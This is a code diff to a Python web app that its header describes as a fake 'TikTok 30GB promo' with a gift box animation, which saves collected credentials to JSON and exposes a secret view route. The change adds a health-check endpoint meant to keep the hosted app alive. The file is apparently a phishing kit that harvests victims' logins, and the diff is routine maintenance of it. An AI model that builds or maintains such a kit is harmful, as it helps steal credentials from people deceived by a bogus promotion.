@@ -1,6 +1,6 @@
 # =============================================================================
 # TIKTOK 30GB PROMO + ATTRACTIVE GIFT BOX ANIMATION – RENDER DEPLOYMENT
-# Credentials saved to JSON + Secret View Route | No Ngrok
+# Credentials saved to JSON + Secret View Route + Health Check Endpoint
 # =============================================================================
 
 import os
@@ -648,6 +648,12 @@ def view_data():
 def test_email():
     success = send_email_alert("Test", f"Test at {datetime.now()}")
     return {"status": "sent" if success else "failed", "timestamp": datetime.now().isoformat()}
+
+# --- NEW: Health Check Endpoint for Keeping Render App Alive ---
+@app.route('/health')
+def health_check():
+    """Simple endpoint for uptime monitoring services to ping."""
+    return 'OK', 200
 
 # -------------------- Main --------------------
 if __name__ == '__main__':
